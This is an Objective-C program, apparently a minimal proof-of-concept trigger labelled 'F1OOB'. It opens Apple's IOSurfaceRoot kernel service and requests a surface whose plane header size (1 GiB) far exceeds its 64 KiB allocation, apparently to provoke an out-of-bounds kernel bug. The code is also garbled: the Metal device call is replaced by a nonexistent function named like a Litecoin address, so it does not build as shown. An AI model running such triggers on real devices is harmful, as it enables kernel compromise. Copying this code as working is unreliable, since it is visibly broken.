#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <IOKit/IOKitLib.h>

int main(int argc, char *argv[]) {
    @autoreleasepool {
        NSLog(@"=== F1OOB Minimal Test ===");
        
        // Test 1: Open IOSurfaceRoot
        io_service_t iosurface_root = IOServiceGetMatchingService(kIOMasterPortDefault,
            IOServiceMatching("IOSurfaceRoot"));
        if (!iosurface_root) {
            NSLog(@"[FAIL] IOSurfaceRoot not found");
            return -1;
        }
        NSLog(@"[OK] IOSurfaceRoot found");
        
        // Test 2: Open service
        io_connect_t conn = 0;
        kern_return_t kr = IOServiceOpen(iosurface_root, mach_task_self(), 0, &conn);
        IOObjectRelease(iosurface_root);
        if (kr != KERN_SUCCESS) {
            NSLog(@"[FAIL] IOServiceOpen failed: %x", kr);
            return -1;
        }
        NSLog(@"[OK] IOServiceOpen success");
        
        // Test 3: Create surface with F1 XML
        const char *xml =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            "<plist version=\"1.0\"><dict>"
            "<key>IOSurfaceIsGlobal</key><true/>"
            "<key>IOSurfaceWidth</key><integer>256</integer>"
            "<key>IOSurfaceHeight</key><integer>256</integer>"
            "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
            "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
            "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
            "<key>IOSurfaceSliceCount</key><integer>4</integer>"
            "</dict></plist>";
        
        uint32_t surface_id = 0;
        kr = IOConnectCallMethod(conn, 0, NULL, 0, xml, strlen(xml)+1, NULL, NULL, &surface_id, NULL);
        IOServiceClose(conn);
        
        if (kr != KERN_SUCCESS) {
            NSLog(@"[FAIL] Surface creation failed: %x", kr);
            return -1;
        }
        NSLog(@"[OK] F1 surface created: ID %u", surface_id);
        
        // Test 4: Metal device
        id<MTLDevice> dev = ltc1qalrd99hju33uagsf8927k7xfxr423gr93gnjz8();
        if (!dev) {
            NSLog(@"[FAIL] No Metal device");
            return -1;
        }
        NSLog(@"[OK] Metal device created");
        
        NSLog(@"[DONE] All tests passed");
        return 0;
    }
}
